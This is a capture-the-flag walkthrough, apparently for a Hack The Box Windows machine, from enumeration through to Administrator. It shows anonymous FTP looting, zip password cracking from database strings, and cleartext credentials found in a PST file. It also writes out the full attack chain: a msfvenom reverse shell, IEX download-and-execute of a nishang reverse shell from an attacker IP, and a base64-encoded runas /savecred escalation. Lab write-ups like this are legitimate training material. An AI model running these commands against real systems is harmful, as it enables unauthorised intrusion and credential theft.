# Attack Path

First enumerate open ports and services:

```bash
sudo nmap -sC -sV -oA nmap/access 10.129.117.249

result:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Let’s see what’s on ftp:

```bash
ftp 10.129.117.249
anonymous   #password is empty

#There are two dirs: Engineer and Backups Let's download everything from the ftp:

wget -m --no-passive ftp://anonymous:anonymous@10.129.117.249

Folders:
Backups:
	- backup.mdb
	
Engineer:
	- Access Control.zip

```

On port 23 it says it might be a telnet service so let’s try that:

```bash
telnet 10.129.117.249

#It asks us for login, trying anonymous:anonymous failed
```

Upon visiting the web page, there is just an image. Let’s run gobuster on it:

```bash
gobuster dir -u http://10.129.117.249 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

result:
/aspnet_client        (Status: 301) [Size: 159] [--> http://10.129.117.249/aspnet_client/]
/Aspnet_client        (Status: 301) [Size: 159] [--> http://10.129.117.249/Aspnet_client/]
/aspnet_Client        (Status: 301) [Size: 159] [--> http://10.129.117.249/aspnet_Client/]
/ASPNET_CLIENT        (Status: 301) [Size: 159] [--> http://10.129.117.249/ASPNET_CLIENT/]
```

## Access Control.zip

While this running in the background let’s find out more information about the downloaded files. Unzipping the zip file failed. Using 7z trying to extract the files prompted us for a password. Let’s find out more information about how the zip is encrypted:

```bash
7z l -slt "Access Control.zip"

result:
----------
Path = Access Control.pst
Folder = -
Size = 271360
Packed Size = 10678
Modified = 2018-08-24 00:13:52.2570000
Created = 2018-08-23 23:44:57.8680000
Accessed = 2018-08-23 23:44:57.9620000
Attributes = A
Encrypted = +
Comment =
CRC = 1D60603C
Method = AES-256 Deflate:Maximum
Characteristics = NTFS WzAES : Encrypt
Host OS = FAT
Version = 20
Volume Index = 0
Offset = 0

```

Can potentially crack the zip file with zip2john:

```bash
zip2john "Access Control.zip"

#Save output to a file that we might use later
```

## backup.mdb

Let’s use strings on the backup.mdb file

```bash
strings backup.mdb  #from the output it does not seem like the file is encrypted

#Let's remove all strings that are not 8 chars:
strings -n 8 backup.mdb | sort -u > ../Engineer/wordlist

#Now let's try and crack the zip file with john
john access_control.hashes --wordlist=wordlist
john access_control.hashes --show

result:
access4u@security
```

Alternatively, we can dump the database on our home dir for easier access:

```bash
mdb-tables backup.mdb #list available tables

for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > tables/$i; done

#Now to sort it in order with line count so we know what dir is not empty
wc -l * | sort -n

interesting result:
auth_user

#let's output auth_user:
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,

#we see that the password for engineer is also here.
```

Now let’s go back to the zip file and unzip it:

```bash
7z x Access\ Control.zip 

file Access\ Control.pst:

result:
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e

#we can use the tool readpst to read it:

readpst Access\ Control.pst #this outputs us a mbox file

#We can now read it the emails.

result:
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```

Now let’s try to use this credential to log on to the telnet service:

```bash
telnet 10.129.117.249
```

![image.png](/assets/access/access-image.png)

We get a shell. Enumerating through the dir we find lnk a file on Public\Desktop. When we output it it has command runas.exe of another user. This suggests that there might be saved credentials on the Desktop. Let’s verify that:

```bash
cmdkey /list

result:
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator

```

Searching up windows runas list creds on Google lead us to https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/StoredCredentialsRunas.md, let’s attempt to use the saved credential and run cmd.exe as Administrator to grant us an Admin shell:

```bash
runas.exe /savecred /user:WORKGROUP\Administrator cmd.exe
```

It did not work. Let’s try to get it to execute a reverse shell. First create the payload with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.132 LPORT=9002 -f exe > shell.exe

#Now transfer the executable to the target:
python3 -m http.server 8001

target:
iwr http://10.10.14.132:8001/shell.exe -OutFile shell.exe #does not work

#let's try an alternative method
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.132:8001/shell.exe')
```

Another problem:

```bash
+ IEX <<<< (New-Object Net.WebClient).downloadString('http://10.10.14.132:8001/shell.exe')
    + CategoryInfo          : ParserError: (}:String) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : UnexpectedToken,Microsoft.PowerShell.Commands.InvokeExpressionCommand

```

Let’s try and use nishang reverse shell ps1. First find Invoke-PowerShellTCP.Ps1 and copy it to attack dir and add this to the bottom of the file:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.132 -Port 9001
```

Now execute it:

```bash
attack host:
nc -lnvp 9001

target host:
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.132:8001/nishang_reverse.ps1')
```

We have an upgraded reverse shell. Let’s download the executable:

```bash
powershell Invoke-WebRequest -Uri "http://10.10.14.132:8001/shell.exe" -OutFile "C:\Users\Public\Desktop\shell.exe"

#DOes not work

#the following command uses /savecred and run commnand as Administrator
runas /savecred /user:ACCESS\Administrator cmd.exe

#Did not work. 
```

Let's try encrypting the execution of ps1 reverse shell in base64 and see if it gets executed. First let’s create a file and put our payload in it and convert it to little endian (that’s how powershell likes it) and then encrypting it in base64:

```bash
payload:
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.132:8001/nishang_reverse.ps1')

cat payload | iconv -t utf-16le | base64 -w 0

result:
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMwAyADoAOAAwADAAMQAvAG4AaQBzAGgAYQBuAGcAXwByAGUAdgBlAHIAcwBlAC4AcABzADEAJwApAAoA
```

Now let’s try and execute the reverse shell as Administrator:

```bash
runas /savecred /user:ACCESS\Administrator "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMwAyADoAOAAwADAAMQAvAG4AaQBzAGgAYQBuAGcAXwByAGUAdgBlAHIAcwBlAC4AcABzADEAJwApAAoA"
```

We now have administrator shell. We can upload mimikatz to try and grab admin password.

- ftp anonymous login
- wget to get files
- john to crack password
- strings to create wordlist from db file
- mdb-tables
- custom script to output tables into files
- 7z to see encryption methods in zip files
- IEX to download and execute files
- abusing runas and savecred
